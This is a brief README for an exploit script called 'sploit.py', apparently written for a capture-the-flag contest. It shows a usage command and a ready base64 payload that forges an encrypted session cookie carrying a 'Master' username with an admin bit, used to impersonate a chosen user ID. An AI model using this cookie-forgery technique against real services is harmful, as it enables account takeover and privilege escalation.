# Handy Sploit

## How To Use

```
./sploit.py \
  --message CgZNYXN0ZXIQAQ== \
  --user_id ${ID_TO_HACK} \
  --url "${SERVICE_HOST}/profile/picture?id=${SOME_ID}&size=1024"
```

- `message`: message to encrypt _without_ control sum and padding.
- `user_id`: ID of the user to hack (UUID in text format).
- `url`: URL to hack, only cookie will be altered when making a request to this URL.

`CgZNYXN0ZXIQAQ==` is a serialized proto with a `Master` username and `IsMaster` bit set to true.